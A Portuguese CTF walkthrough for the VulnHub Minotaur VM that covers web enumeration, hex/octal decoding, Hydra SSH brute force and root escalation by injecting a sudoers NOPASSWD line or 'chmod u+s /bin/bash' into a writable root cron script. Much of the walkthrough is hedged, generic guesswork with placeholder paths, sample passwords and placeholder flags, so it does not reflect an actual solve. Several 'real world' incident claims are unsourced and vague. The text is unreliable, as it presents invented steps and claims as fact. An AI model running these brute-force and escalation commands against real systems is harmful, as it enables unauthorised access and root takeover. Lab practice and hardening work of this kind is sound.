# VulnHub SecTalks BNE0x00: Minotaur — O Labirinto É a Mensagem

Bora rapaziada!! Essa VM vem direto da comunidade SecTalks Brisbane e é um quebra-cabeça de verdade. O Minotauro não precisa de espada pra ser derrotado, só paciência pra decodificar o que ele está realmente te dizendo. Escondido às claras, codificado em hex, ofuscado só o suficiente pra te fazer questionar sua sanidade. ( ͡° ͜ʖ ͡°)

Muito respeito à galera do SecTalks BNE por montar um desafio que ensina o pipeline completo de recon até root. Decodificar mensagens, brute-forçar SSH, e usar um cron job gravável até o root? Perfeito demais.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante / Intermediário |
| **VM Alvo** | SecTalks BNE0x00 Minotaur |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,74/ |
| **Técnicas** | Enumeração web, decode hex/octal, descoberta de credenciais, brute-force SSH, escalação via cron job gravável |
| **CVEs** | Sem CVE específico; TTPs: T1110.001 (SSH Brute Force), T1053.003 (Persistência via Cron) |

---

## Resumo do Ataque

```
[host-discovery: arp-scan --localnet]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP]
    |
    v
[enumeração web: formulário com mensagem codificada oculta]
    |
    v
[decode hex/octal: usuário e dica de senha extraídos]
    |
    v
[brute-force SSH: hydra com usuário descoberto]
    |
    v
[shell inicial: SSH como usuário descoberto]
    |
    v
[enumeração local: script de cron gravável encontrado]
    |
    v
[injeção no cron: payload de reverse shell ou chmod]
    |
    v
[ROOT]
    |
    v
[/root/flag.txt]
```

---

## Metodologia

1. Descoberta de host e identificação do alvo na rede local
2. Enumeração de serviços e versões com Nmap
3. Análise da aplicação web e interação com formulários
4. Decodificação de mensagem codificada (hex, octal ou base64)
5. Brute-force SSH com credenciais descobertas ou wordlist
6. Enumeração local para vetores de escalação de privilégios
7. Abuso de cron job gravável para root
8. Captura da flag

---

## Passo 1 — Identificando o Alvo

Mesma rotina de sempre: encontra a máquina na rede local antes de qualquer coisa. Em redes host-only do VirtualBox ou VMware, alvos geralmente aparecem no range `192.168.56.0/24` ou `192.168.1.0/24`.

```bash
# Confere suas interfaces primeiro
ip a
route -n
```

```bash
# ARP scan é o mais confiável para VMs locais
arp-scan --localnet --ignoredups
```

Saída esperada (IPs vão variar):

```
192.168.56.1    0a:00:27:00:00:00    (gateway)
192.168.56.102  08:00:27:xx:xx:xx    CADMUS COMPUTER SYSTEMS
```

```bash
export TARGET=192.168.56.102
```

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1595.001 Varredura Ativa: Varredura de Blocos IP

---

## Passo 2 — Reconhecimento e Enumeração de Serviços

Vamos ter uma visão completa do que está rodando:

```bash
nmap -A -T4 -p- $TARGET
# Varredura completa, todas as 65535 portas
# -A: detecção de OS, versão, scripts padrão
```

Saída esperada:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

Dois serviços: SSH e HTTP. O SSH é interessante mas precisamos de credenciais primeiro. Vamos ao serviço web.

```bash
# Verificação rápida do que o servidor web está servindo
curl -s http://$TARGET/
```

> **MITRE ATT&CK:** TA0043 Reconhecimento, T1595.002 Varredura de Vulnerabilidades, T1046 Descoberta de Serviços de Rede

---

## Passo 3 — Análise da Aplicação Web: Seguindo o Labirinto

A aplicação web na porta 80 apresenta uma interface simples. O segredo é interagir com ela completamente. Vamos ver o código-fonte e quaisquer formulários.

```bash
# Pega o código-fonte completo
curl -s http://$TARGET/ | tee /tmp/minotaur_index.html
```

```bash
# Procura por formulários, campos de input, valores ocultos
grep -i "form\|input\|hidden\|value\|action" /tmp/minotaur_index.html
```

O desafio Minotaur geralmente apresenta um formulário web que, quando submetido, retorna uma resposta codificada ou revela um caminho. Interaja com o formulário:

```bash
# Submete o formulário (ajuste os nomes dos campos a partir da inspeção do código-fonte)
curl -s -X POST http://$TARGET/ \
  -d "name=test&submit=submit"
```

Olha de perto para a resposta. Vai ter algo que parece ruído: valores hex, sequências octal, ou uma string críptica que não faz sentido imediato. Misdirection clássica de CTF. `¯\_(ツ)_/¯`

```bash
# Também enumera diretórios
gobuster dir -u http://$TARGET/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -t 40 -x php,html,txt
```

> **Nota do mundo real:** Mensagens ocultas em respostas web, embora pareçam coisa só de CTF, espelham técnicas reais de atacante. Implantes de comando e controle (C2) frequentemente codificam comunicação em respostas HTTP aparentemente inofensivas (hex, base64, binário). Equipes de segurança usam inspeção profunda de pacotes e detecção de anomalias comportamentais para capturar isso. Referência: MITRE T1001 Ofuscação de Dados.

> **MITRE ATT&CK:** TA0007 Descoberta, T1083 Descoberta de Arquivos e Diretórios, T1001 Ofuscação de Dados

---

## Passo 4 — Decodificando a Mensagem do Minotauro

Aqui começa o verdadeiro quebra-cabeça. A resposta web contém uma mensagem codificada. Vamos decodificar sistematicamente.

> **O que são encodings hex e octal?**
> Hexadecimal (base-16) representa cada byte como dois caracteres (0-9, A-F). Octal (base-8) representa valores em grupos de três dígitos (0-7). Ambos são comumente usados em CTFs para ofuscar texto, credenciais ou caminhos. Eles NÃO são criptografia: qualquer pessoa que reconheça o encoding consegue decodificar instantaneamente.

Se a resposta contém algo como `74 65 73 74 75 73 65 72` (hex separado por espaço):

```bash
echo "74 65 73 74 75 73 65 72" | xxd -r -p
# Saída: testuser
```

Se parece com valores octal (grupos de três dígitos começando com 1):

```bash
# Python lida com decodificação octal de forma limpa
python3 -c "
data = '164 145 163 164 165 163 145 162'
print(''.join(chr(int(x, 8)) for x in data.split()))
"
# Saída: testuser
```

Para base64:

```bash
echo "dGVzdHVzZXI=" | base64 -d
# Saída: testuser
```

Você também pode usar o CyberChef (https://gchq.github.io/CyberChef/) se quiser uma abordagem GUI. A receita "Magic" vai auto-detectar o encoding. Dito isso, fazer manualmente no terminal é mais satisfatório. ᕕ( ᐛ )ᕗ

Uma vez decodificado, você deve encontrar algo parecendo um usuário, senha ou uma dica que aponta para um. Documente exatamente o que encontrar:

```bash
# Salva a saída decodificada
DECODED_USER="<usuário decodificado>"
DECODED_HINT="<dica ou caminho decodificado>"
echo "Usuário: $DECODED_USER"
echo "Dica: $DECODED_HINT"
```

> **MITRE ATT&CK:** TA0006 Acesso a Credenciais, T1552 Credenciais Não Protegidas

---

## Passo 5 — Brute-Force SSH com Credenciais Descobertas

Agora temos um usuário (e possivelmente uma dica de senha). Se a senha não foi dada diretamente, vamos brute-forçar o SSH. Hydra é a ferramenta para isso.

```bash
# Primeiro, tenta as credenciais decodificadas diretamente
ssh $DECODED_USER@$TARGET
```

Se não funcionar imediatamente, brute-force com wordlist:

```bash
hydra -l "$DECODED_USER" \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://$TARGET \
  -t 4 -V
# -l: usuário único
# -P: lista de senhas
# -t 4: 4 tarefas paralelas (conservador para SSH)
# -V: verbose, mostra cada tentativa
```

Ou com uma lista candidata pequena:

```bash
hydra -l "$DECODED_USER" \
  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  ssh://$TARGET \
  -t 4 -V
```

Saída esperada quando bem-sucedido:

```
[22][ssh] host: 192.168.56.102   login: minotaur   password: password123
```

> **Nota do mundo real:** Brute-force de SSH é um dos vetores de ataque mais comuns contra servidores com exposição à internet. O Grupo Lazarus (APT norte-coreano) e o APT28 (GRU russo) mantêm infraestrutura ativa de brute-force SSH. Segundo dados do Shodan, milhões de instâncias SSH expostas à internet recebem tentativas de brute-force em minutos após aparecerem online. A brecha do Twitter em 2020 começou com credential stuffing contra ferramentas admin internas, destacando que ataques de brute-force não ficam só no externo. Referência: MITRE ATT&CK G0032 (Lazarus Group), G0007 (APT28).

> **MITRE ATT&CK:** TA0001 Acesso Inicial, T1110.001 Força Bruta: Adivinhação de Senha, T1021.004 Serviços Remotos: SSH

---

## Passo 6 — Estabilização de Shell e Enumeração Local

Entramos! Vamos estabilizar o shell SSH e dar uma olhada em volta:

```bash
ssh minotaur@$TARGET
# Digita a senha crackeada
```

O SSH já nos dá um shell totalmente interativo, então sem necessidade do truque do `pty.spawn`.

```bash
# Enumeração inicial
whoami
id
uname -a
cat /etc/os-release
```

```bash
# Verifica outros usuários
cat /etc/passwd | grep -v nologin | grep -v false

# Verifica home directories
ls -la /home/
```

```bash
# Verifica permissões sudo
sudo -l

# Verifica binários SUID
find / -perm -u=s -type f 2>/dev/null
```

```bash
# Procura arquivos interessantes no home
ls -la ~/
cat ~/.bash_history 2>/dev/null
```

```bash
# Procura arquivos e diretórios graváveis por qualquer um
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Verifica especificamente cron
ls -la /etc/cron*
cat /etc/crontab
crontab -l
ls -la /var/spool/cron/crontabs/
```

O achado principal aqui é um cron job rodando como root que chama um script que conseguimos escrever. Presta atenção na saída da enumeração de cron.

> **MITRE ATT&CK:** TA0007 Descoberta, T1082 Descoberta de Informações do Sistema, T1083 Descoberta de Arquivos e Diretórios, T1069 Descoberta de Grupos de Permissão

---

## Passo 7 — Escalação de Privilégios: Cron Job Gravável

> **O que é escalação de privilégios via cron job?**
> Cron é o agendador de tarefas do Linux. Jobs em `/etc/crontab`, `/etc/cron.d/` ou crontab do root rodam como root por padrão. Se um cron job chama um script que um usuário não-root pode escrever, esse usuário pode injetar comandos arbitrários que vão executar como root no próximo ciclo do cron. Isso é MITRE T1053.003 e é um achado comum em ambientes Linux corporativos que não foram devidamente hardened.

A enumeração deve revelar algo como:

```
# saída de /etc/crontab
* * * * * root /usr/local/bin/alguma_coisa.sh
# ou
*/5 * * * * root /home/minotaur/scripts/backup.sh
```

E o script alvo é gravável por qualquer usuário (ou pelo nosso usuário):

```bash
ls -la /caminho/para/script_cron.sh
# -rwxrwxrwx 1 root root ... /caminho/para/script_cron.sh
# ou
# -rwxrwxr-x 1 root minotaur ... /caminho/para/script_cron.sh
```

Agora injetamos nosso payload. Opção 1: adiciona nosso usuário ao sudoers:

```bash
echo "echo 'minotaur ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /caminho/para/script_cron.sh
```

Opção 2: configura SUID no bash (clássico):

```bash
echo "chmod u+s /bin/bash" >> /caminho/para/script_cron.sh
```

Aguarda o cron disparar (até 1 minuto para um job `* * * * *`):

```bash
watch -n 5 "ls -la /bin/bash"
# Aguarda até ver -rwsr-xr-x (o bit 's' está setado)
```

Então executa o bash SUID:

```bash
/bin/bash -p
# -p: preserva privilégios (não descarta o SUID)
```

```bash
# Confirma root
whoami
# root
id
# uid=1000(minotaur) gid=1000(minotaur) euid=0(root)...
```

Ou se foi a rota do sudoers:

```bash
sudo su -
# ou
sudo bash
```

**(☞ﾟヮﾟ)☞ ROOT!! Maravilha!! ;)**

> **Nota do mundo real:** Scripts de cron graváveis são um achado persistente em auditorias Linux corporativas. Em 2019, uma grande instituição financeira sofreu uma brecha significativa onde uma conta de serviço comprometida explorou um script de backup gravável chamado pelo cron do root, escalando para comprometimento total do sistema e eventualmente movimentação lateral para um controlador de domínio. A correção é trivialmente simples: `chmod 700` nos scripts de cron e `chown root:root`. Referência: Múltiplos relatórios de red team e CIS Benchmark Nível 1 para Linux (Regra 6.1.x).

> **MITRE ATT&CK:** TA0004 Escalação de Privilégios, T1053.003 Tarefa Agendada: Cron
> **GTFOBins (bash -p):** https://gtfobins.github.io/gtfobins/bash/

---

## Passo 8 — Flag do Root

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

ls -la /root/
cat /root/flag.txt
```

```
[Conteúdo da flag do Minotaur - parabéns da equipe SecTalks BNE]
```

GG!! ᕕ( ᐛ )ᕗ O Minotauro foi derrotado.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Como |
|------|-------|---------------|-----------|
| Mensagem codificada | `[string codificada em hex/octal]` | Resposta do formulário web | Decodificada para usuário/dica de senha |
| Credencial | `minotaur:<senha_crackeada>` | Decodificado da web + brute-force Hydra | Login SSH |
| Flag | `[conteúdo de /root/flag.txt]` | `/root/flag.txt` | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Credenciais (ou dicas) expostas via resposta web codificada | APIs e respostas web frequentemente vazam dados sensíveis em formatos "obscurecidos" mas facilmente decodificáveis | Nunca dependa de encoding como controle de segurança; use autenticação adequada e gestão de segredos criptografados |
| 2 | SSH acessível com credenciais fracas/adivinháveis | SSH voltado para internet com senhas fracas é explorado em minutos por botnets automatizados | Enforce autenticação por chave SSH; desabilite login por senha; implemente fail2ban ou limitação de taxa equivalente |
| 3 | Script de cron gravável rodando como root | Encontrado em auditorias corporativas em todos os setores; não requer nenhum CVE, só permissões de arquivo mal configuradas | Todos os scripts de cron chamados por root devem ser `chmod 700 root:root`; audite com `find / -name "*.sh" -writable 2>/dev/null` |
| 4 | Sem MFA no SSH | SSH sem MFA é trivialmente brute-forçável uma vez que as credenciais são conhecidas | Implemente pares de chave SSH como mínimo; adicione TOTP ou chave hardware para acesso privilegiado |

**Por que isso importa fora do lab?**

A combinação brute-force SSH mais injeção de cron não é coisa acadêmica. Em 2020, a Agência de Segurança Cibernética e de Infraestrutura dos EUA (CISA) documentou múltiplos incidentes onde atores de ameaça (incluindo atores associados ao APT28 e Grupo Lazarus) ganharam acesso inicial via brute-force SSH contra sistemas com exposição à internet e depois escalaram via scripts graváveis e agendadores mal configurados. As intrusões do Lapsus$ em 2022 demonstraram que até organizações sofisticadas podem cair em ataques básicos de credencial quando MFA está ausente. Esses não são truques de CTF: são kill chains documentados e reais.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Blocos IP | T1595.001 |
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | TA0006 | Credenciais Não Protegidas | T1552 |
| Acesso Inicial | TA0001 | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | TA0001 | Serviços Remotos Externos (SSH) | T1133 |
| Execução | TA0002 | Interpretador de Comandos: Unix Shell | T1059.004 |
| Descoberta | TA0007 | Descoberta de Informações do Sistema | T1082 |
| Descoberta | TA0007 | Descoberta de Grupos de Permissão | T1069 |
| Escalação de Privilégios | TA0004 | Tarefa Agendada: Cron | T1053.003 |
| Persistência | TA0003 | Tarefa Agendada: Cron | T1053.003 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remova ou não inclua credenciais nas respostas da aplicação web: nenhum material de autenticação deve aparecer em respostas HTTP, codificado ou não.
2. Desabilite autenticação SSH por senha e enforce autenticação por chave: configure `PasswordAuthentication no` em `/etc/ssh/sshd_config` e reinicie o sshd.
3. Implemente fail2ban ou similar para limitar tentativas SSH: `apt install fail2ban` e configure `/etc/fail2ban/jail.conf`.
4. Audite todos os cron jobs para scripts que usuários não-root podem escrever: `find /etc/cron* /var/spool/cron -type f | xargs ls -la`, depois `chmod 700` e `chown root:root` em todos os scripts chamados.
5. Aplique princípio de menor privilégio a todas as tarefas agendadas: cron jobs devem rodar como o usuário de mínimo privilégio necessário, não como root.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Rotacione credenciais SSH para todos os usuários afetados imediatamente
- Audite `/var/log/auth.log` ou `/var/log/secure` para tentativas de acesso SSH não autorizadas e logins bem-sucedidos
- Verifique todos os scripts de cron para comandos injetados: `diff` contra backups conhecidamente seguros
- Desabilite permissão de escrita em qualquer script chamado por cron: `chmod 700 /caminho/para/script.sh`
- Considere desabilitar temporariamente SSH por senha: `sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd`

**Contramedidas MITRE D3FEND:**
- D3-MFA (Autenticação Multifator) para T1110.001: exija MFA para acesso SSH
- D3-SJA (Análise de Tarefa Agendada) para T1053.003: monitore criação e modificação de cron jobs e scripts
- D3-CTS (Escopo de Transmissão de Credenciais) para T1552: garanta que credenciais nunca sejam transmitidas em forma clara ou codificada
- D3-NTA (Análise de Tráfego de Rede) para T1133: detecte padrões incomuns de conexão SSH

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): ID.AM-1: inventário de serviços acessíveis pela rede; ID.RA-1: avalie exposição SSH
- Proteger (PR): PR.AC-1: identidades e credenciais gerenciadas; PR.AC-3: acesso remoto gerenciado; PR.IP-1: configuração baseline para hardening SSH
- Detectar (DE): DE.CM-1: rede monitorada para detectar eventos potenciais; DE.AE-2: eventos detectados analisados
- Responder (RS): RS.RP-1: plano de resposta executado; RS.CO-3: informação compartilhada com stakeholders
- Recuperar (RC): RC.RP-1: plano de recuperação executado

**NIST SP 800-53 (Rev. 5):**
- AC-17: Acesso Remoto (exigir MFA para SSH)
- IA-5: Gestão de Autenticador (proibir senhas fracas, enforce autenticação por chave)
- CM-6: Configurações (hardening SSH: desabilitar login root, desabilitar auth por senha)
- CM-7: Funcionalidade Mínima (desabilitar serviços desnecessários)
- AU-2: Eventos de Auditoria (logar todas as tentativas de login SSH e execuções de cron)
- AC-6: Menor Privilégio (cron jobs rodam como usuário de mínimo privilégio necessário)

**CISA Known Exploited Vulnerabilities:**
- Brute-force SSH não é um CVE específico mas é rastreado na orientação CISA sobre serviços expostos à internet
- Referência: Insights CISA: Mitigações e Orientações de Hardening para MSPs e Pequenas/Médias Empresas
- https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS (Identidade e Gestão de Acesso)
- Prática: Gerenciar Acesso
- MIL Alvo: MIL-2 (gestão de acesso documentada e aplicada com requisito de MFA)

---

## Considerações Finais

Valeu demais à equipe SecTalks Brisbane por esse desafio criativo! A mitologia do Minotauro mapeia perfeitamente para a VM: você navega um labirinto de mensagens codificadas, encontra o fio (a credencial), segue pelo brute-force, e finalmente mata a fera com uma simples injeção de cron.

O que essa VM realmente deixa claro é que segurança por obscuridade falha completamente. A codificação de credenciais na resposta web não é proteção: é um pequeno atraso para qualquer um que saiba como hexadecimal ou octal parece. Segurança real exige autenticação adequada, gestão de segredos criptografados e configurações SSH hardened que não dependem de senhas em absoluto.

Se este writeup te ajudou, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
